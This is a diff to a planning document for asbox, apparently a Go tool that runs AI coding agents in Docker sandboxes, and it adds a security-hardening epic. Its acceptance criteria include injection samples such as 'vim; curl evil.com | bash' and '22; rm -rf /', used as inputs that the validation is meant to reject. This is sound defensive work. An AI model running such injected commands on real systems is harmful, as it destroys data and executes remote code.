@@ -211,6 +211,10 @@ N/A — asbox is a CLI tool with no GUI. No UX design document applicable.
 | FR57 | Epic 1 | --agent CLI flag to override default agent at runtime |
 | FR58 | Epic 1 | Short agent names (claude, gemini, codex) |
 | FR59 | Epic 1 | Agent config registry for automatic host_agent_config paths |
+| NFR5 | Epic 11 | Config input sanitization (SDK, packages, ENV, project_name) |
+| NFR11 | Epic 11 | Non-TTY runtime support for CI/CD |
+| NFR12 | Epic 11 | Pinned build dependencies for reproducibility |
+| NFR14 | Epic 11 | Concurrent sandbox session support |
 
 ## Epic List
 
@@ -253,6 +257,18 @@ Comprehensive integration tests verify sandbox lifecycle, mounts, secrets, isola
 ### Epic 10: Remove Legacy Bash Implementation
 Remove all files from the original bash sandbox implementation that have been fully replaced by the Go rewrite. Update documentation to reflect the Go project structure.
 **FRs covered:** N/A (cleanup)
+
+### Epic 11: Hardening for Production Readiness
+A developer can run concurrent sandbox sessions, use asbox in CI/CD pipelines, and trust that all configuration inputs are validated against injection risks, with reproducible image builds via pinned dependencies and safe agent command execution.
+**FRs covered:** NFR5, NFR11, NFR12, NFR14
+
+**Stories:**
+- 11-1: Concurrent Sandbox Sessions — random suffix, conflict detection, backward compat, cleanup verification
+- 11-2: SDK, Package, and Project Name Sanitization — semver validation, apt-safe charset, explicit project_name
+- 11-3: ENV Key/Value Validation — shell variable name format, newline injection blocking
+- 11-4: Non-TTY Runtime Support — TTY detection, conditional -it vs -i
+- 11-5: Pinned Build Dependencies — Docker Compose, npm agents, multi-arch base image digest, update workflow
+- 11-6: Agent Command Injection Hardening — replace bash -c with exec array pattern
 
 ## Epic 1: Developer Can Build and Launch a Sandbox
 
@@ -1213,3 +1229,213 @@ So that the repository contains only the canonical Go implementation with accura
 - Pure deletion + documentation rewrite — no Go code changes
 - Historical references in `_bmad-output/` implementation artifacts are left intact (they document the migration journey)
 - The `Makefile` has no bash references and needs no changes
+
+## Epic 11: Hardening for Production Readiness
+
+A developer can run concurrent sandbox sessions, use asbox in CI/CD pipelines, and trust that all configuration inputs are validated against injection risks, with reproducible image builds via pinned dependencies and safe agent command execution.
+
+### Story 11.1: Concurrent Sandbox Sessions
+
+As a developer,
+I want to run multiple sandbox sessions simultaneously against the same or different projects,
+So that I can delegate tasks to multiple agents in parallel without container name collisions.
+
+**Acceptance Criteria:**
+
+**Given** a developer runs `asbox run` for a project
+**When** the container is created
+**Then** the container name uses the pattern `asbox-<project>-<suffix>` where `<suffix>` is a short random string (e.g., 6 hex chars), ensuring uniqueness across concurrent runs
+
+**Given** a developer runs two `asbox run` commands for the same project simultaneously
+**When** both containers start
+**Then** both sessions launch successfully with distinct container names and no conflict error
+
+**Given** a developer runs `asbox run` and then exits with Ctrl+C
+**When** the session ends
+**Then** the container with the random-suffixed name is removed cleanly, and `docker ps -a` shows no orphaned asbox containers for that session
+
+**Given** a developer runs two concurrent sandbox sessions
+**When** both sessions exit (via Ctrl+C or normal termination)
+**Then** both containers are removed and no orphaned containers or networks remain
+
+**Given** the container naming scheme has changed from deterministic to random-suffixed
+**When** existing scripts or workflows reference the old `asbox-<project>` name
+**Then** the `asbox-<project>` prefix is preserved as the first part of the name, maintaining greppability and log identification
+
+**Implementation Notes:**
+- Modify `internal/docker/run.go` to append a random suffix (e.g., `crypto/rand` hex) to the container name
+- Container name pattern: `asbox-<project>-<6-char-hex>`
+- Ensure `docker rm -f` in cleanup uses the actual container name returned by Docker, not a reconstructed name
+- Update any container name references in `cmd/run.go`
+
+### Story 11.2: SDK, Package, and Project Name Sanitization
+
+As a developer,
+I want asbox to validate SDK versions, package names, and project names in my config,
+So that malformed or malicious values cannot inject shell commands into the generated Dockerfile.
+
+**Acceptance Criteria:**
+
+**Given** a config.yaml with an SDK version containing shell metacharacters (e.g., `nodejs: "22; rm -rf /"`)
+**When** asbox parses the config via `config.Parse()`
+**Then** the CLI exits with code 1 and prints an error identifying the invalid SDK version and the allowed character set
+
+**Given** a config.yaml with a valid SDK version (e.g., `nodejs: "22"`, `python: "3.12"`, `go: "1.23.1"`)
+**When** asbox parses the config
+**Then** the version is accepted — allowed characters: digits, dots, hyphens, plus signs (semver-compatible)
+
+**Given** a config.yaml with a package name containing shell metacharacters (e.g., `packages: ["vim; curl evil.com | bash"]`)
+**When** asbox parses the config
+**Then** the CLI exits with code 1 and prints an error identifying the invalid package name
+
+**Given** a config.yaml with an empty string in the packages list (e.g., `packages: ["", "vim"]`)
+**When** asbox parses the config
+**Then** the CLI exits with code 1 and prints an error rejecting empty package names
+
+**Given** a config.yaml with `project_name: "my-project; rm -rf /"` (explicitly set, not derived)
+**When** asbox parses the config
+**Then** the explicit `project_name` is sanitized through the same `sanitizeProjectName()` logic as derived names, and invalid characters are stripped or rejected
+
+**Given** a config.yaml with valid package names (e.g., `packages: ["vim", "build-essential", "libpq-dev"]`)
+**When** asbox parses the config
+**Then** all package names are accepted — allowed characters: alphanumeric, hyphens, dots, plus signs, colons (apt package name format)
+
+**Implementation Notes:**
+- Add `validateSDKVersion()` in `internal/config/parse.go` — regex: `^[0-9a-zA-Z.\-+]+$`
+- Add `validatePackageName()` — regex: `^[a-zA-Z0-9][a-zA-Z0-9.\-+:]*$`
+- Apply `sanitizeProjectName()` to explicit `project_name` values, not just derived ones
+- All validation happens in `Parse()` before any downstream consumers see the values
+
+### Story 11.3: ENV Key/Value Validation
+
+As a developer,
+I want asbox to validate environment variable keys and values in my config,
+So that malformed ENV entries cannot inject arbitrary Dockerfile directives.
+
+**Acceptance Criteria:**
+
+**Given** a config.yaml with an ENV key containing spaces (e.g., `env: {"MY VAR": "value"}`)
+**When** asbox parses the config
+**Then** the CLI exits with code 1 and prints an error identifying the invalid ENV key and the allowed format
+
+**Given** a config.yaml with an ENV key starting with a digit (e.g., `env: {"1VAR": "value"}`)
+**When** asbox parses the config
+**Then** the CLI exits with code 1 and prints an error — ENV keys must start with a letter or underscore
+
+**Given** a config.yaml with valid ENV keys (e.g., `env: {"MY_VAR": "value", "DEBUG": "true", "_INTERNAL": "1"}`)
+**When** asbox parses the config
+**Then** all keys are accepted — allowed format: `^[a-zA-Z_][a-zA-Z0-9_]*$`
+
+**Given** a config.yaml with an ENV value containing a newline (via YAML multiline string)
+**When** asbox parses the config
+**Then** the CLI exits with code 1 and prints an error — newlines in ENV values could inject Dockerfile directives
+
+**Given** a config.yaml with normal ENV values including quotes, equals signs, and spaces (e.g., `env: {"DSN": "host=localhost dbname=test"}`)
+**When** asbox parses the config
+**Then** the values are accepted — only newlines and null bytes are rejected in values
+
+**Implementation Notes:**
+- Add `validateEnvKey()` in `internal/config/parse.go` — regex: `^[a-zA-Z_][a-zA-Z0-9_]*$`
+- Add `validateEnvValue()` — reject strings containing `\n`, `\r`, or `\0`
+- Ensure the Dockerfile template quotes ENV values: `ENV {{$k}}="{{$v}}"` (already done in story 1-3)
+- Validate in `Parse()` loop over `cfg.Env` map
+
+### Story 11.4: Non-TTY Runtime Support
+
+As a developer,
+I want asbox to detect whether it's running in a terminal or in a CI/CD pipeline,
+So that sandbox sessions work correctly in both interactive and non-interactive contexts.
+
+**Acceptance Criteria:**
+
+**Given** a developer runs `asbox run` in an interactive terminal
+**When** the container is started
+**Then** Docker is invoked with `-it` flags (interactive + TTY allocated) and the agent session is fully interactive
+
+**Given** a developer runs `asbox run` in a non-TTY context (e.g., CI/CD pipeline, piped input)
+**When** the container is started
+**Then** Docker is invoked with `-i` only (interactive, no TTY) — no "the input device is not a TTY" error
+
+**Given** a developer pipes input to `asbox run` (e.g., `echo "test" | asbox run`)
+**When** the container is started
+**Then** the piped input is forwarded to the container's stdin without TTY allocation errors
+
+**Given** the TTY detection logic
+**When** inspected
+**Then** it uses `term.IsTerminal(os.Stdin.Fd())` or equivalent to detect terminal presence — not environment variable heuristics
+
+**Implementation Notes:**
+- Add `golang.org/x/term` dependency (or use `golang.org/x/sys/unix` — `unix.IoctlGetTermios`)
+- Modify `internal/docker/run.go` `RunContainer()` to conditionally include `-t` flag based on TTY detection
+- Always include `-i` (interactive) — only `-t` (TTY) is conditional
+- Update existing tests that assert `-it` to handle both cases
+
+### Story 11.5: Pinned Build Dependencies
+
+As a developer,
+I want Dockerfile dependencies to be version-pinned for reproducible builds,
+So that sandbox images built today produce the same result as images built next month.
+
+**Acceptance Criteria:**
+
+**Given** the Dockerfile template installs Docker Compose
+**When** the image is built
+**Then** Docker Compose is installed at a specific pinned version (e.g., `v2.32.4`) fetched from a versioned GitHub release URL — not from the GitHub API `latest` endpoint
+
+**Given** the Dockerfile template installs `gemini-cli` via npm
+**When** the image is built
+**Then** `gemini-cli` is installed at a specific pinned version (e.g., `npm install -g @anthropic-ai/gemini-cli@1.2.3`)
+
+**Given** the Dockerfile template installs `@openai/codex` via npm
+**When** the image is built
+**Then** `@openai/codex` is installed at a specific pinned version
+
+**Given** the Dockerfile template specifies the base image
+**When** the image is built
+**Then** the base image uses a multi-arch manifest digest (e.g., `ubuntu:24.04@sha256:<multi-arch-digest>`) that works on both amd64 and arm64
+
+**Given** a developer or maintainer needs to bump pinned versions
+**When** they look for guidance
+**Then** a comment block in `embed/Dockerfile.tmpl` documents the version update process: which URLs to check, how to obtain multi-arch digests, and how to verify the update
+
+**Implementation Notes:**
+- Pin Docker Compose: change from GitHub API latest to explicit version URL
+- Pin npm packages: add `@version` suffix to all `npm install -g` commands
+- Base image digest: use `docker manifest inspect ubuntu:24.04` to get multi-arch digest; test on both amd64 and arm64
+- Add comment block at top of `embed/Dockerfile.tmpl` documenting the pinning and update process
+- Content hash will change when versions are bumped — this is correct behavior
+
+### Story 11.6: Agent Command Injection Hardening
+
+As a developer,
+I want agent launch commands to be executed safely without shell expansion risks,
+So that agent command strings cannot be exploited through shell injection.
+
+**Acceptance Criteria:**
+
+**Given** an agent is launched inside the sandbox
+**When** the entrypoint executes the agent command
+**Then** the command is executed via `exec gosu sandbox` with explicit arguments — not via `bash -c "${AGENT_CMD}"`
+
+**Given** the agent command for claude is `claude --dangerously-skip-permissions`
+**When** the entrypoint launches the agent
+**Then** the command is split into an argument array `["claude", "--dangerously-skip-permissions"]` and executed directly — no shell interpolation occurs
+
+**Given** the agent command for gemini is `gemini -y`
+**When** the entrypoint launches the agent
+**Then** it is executed as `exec gosu sandbox gemini -y` — direct exec, no `bash -c` wrapper
+
+**Given** the agent command for codex is `codex --dangerously-bypass-approvals-and-sandbox`
+**When** the entrypoint launches the agent
+**Then** it is executed as a direct exec with explicit arguments
+
+**Given** the `AGENT_CMD` environment variable is set by the Go CLI
+**When** the entrypoint reads it
+**Then** the variable format supports safe argument splitting (e.g., space-separated tokens where each token is a single argument) and the entrypoint does not pass the value through `bash -c`
+
+**Implementation Notes:**
+- Modify `embed/entrypoint.sh` to replace `exec gosu sandbox bash -c "${AGENT_CMD}"` with direct exec
+- Option A: Split `AGENT_CMD` on spaces and exec directly: `exec gosu sandbox ${AGENT_CMD}` (word splitting without `bash -c`)
+- Option B: Pass separate env vars `AGENT_BIN` and `AGENT_ARGS` for explicit control
+- Option A is simpler and sufficient since agent commands are controlled by the Go CLI, not user input
+- Update all agent command strings in `cmd/run.go` to ensure they are safe for word-splitting
